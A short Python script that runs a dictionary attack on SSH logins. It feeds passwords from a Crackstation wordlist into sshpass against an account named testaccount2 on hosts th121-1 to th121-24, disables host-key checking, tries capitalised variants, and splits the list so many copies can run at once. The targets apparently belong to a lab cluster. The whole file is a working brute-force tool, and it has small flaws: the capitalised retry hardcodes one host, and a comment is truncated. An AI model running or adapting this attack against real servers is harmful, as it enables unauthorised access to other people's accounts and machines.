import os
import time
import sys
from threading import Thread
import random
#run this file many ti
def attmpt_pass(list, machine_num):
	
	for passwd in list:
		
		if (len(passwd) > 7 and passwd[0] != "!" and passwd[0] != "?" and passwd[0] != "@" and passwd[0] != "\"" and passwd[0] != "#" and passwd[0] != "$" and passwd[0] != "(" and passwd[0] != ")" and passwd[0] != "%" and passwd[0] != "^" and passwd[0] != "~" and passwd[0] != "&" and passwd[0] != "\'" and passwd[0] != "*" and passwd[0] != "<" and passwd[0] != ">" and passwd[0] != "." and passwd[0] != "," and passwd[0] != "[" and passwd[0] != "]" and passwd[0] != "|" and passwd[0] != "/" and passwd[0] != "{" and passwd[0] != "}" and passwd[0] != "_" and passwd[0] != "-" and passwd[0] != ";" and passwd[0] != ":" and passwd[0] != "+" and " " not in passwd):
			stmt = "sshpass -p \"" + passwd.strip() +  "\" ssh -o StrictHostKeyChecking=no testaccount2@th121-" + str(machine_num)
			print(stmt)
			log = os.system(stmt)
			if (log == 0):
				print(passwd)
				break
			if (passwd[0].upper() != passwd[0]):
				passwd = passwd.capitalize()
				stmt = "sshpass -p \"" + passwd.strip() +  "\" ssh -o StrictHostKeyChecking=no testaccount2@th121-2"
				print(stmt)
				log = os.system(stmt)
			if (log == 0):
				print(passwd)
				break

f = open("crackstation-human-only.txt", "r")
dictPass = f.read().splitlines()
print(len(dictPass))
NUM_THREADS = 128

lengths = []
lengths.append(0)
for i in range(NUM_THREADS):
	lengths.append(round(len(dictPass)* ((i + 1)/NUM_THREADS)))
#print(lengths)

#for t in range(NUM_THREADS):
#	worker = Thread(target=attmpt_pass(dictPass[lengths[t]:lengths[t+1]],random.randint(1,24)))
#	worker.start()
print(sys.argv[0])
attmpt_pass(dictPass[lengths[int(sys.argv[1])]:lengths[int(sys.argv[2])]],random.randint(1,24))	

	#time.sleep(.5)
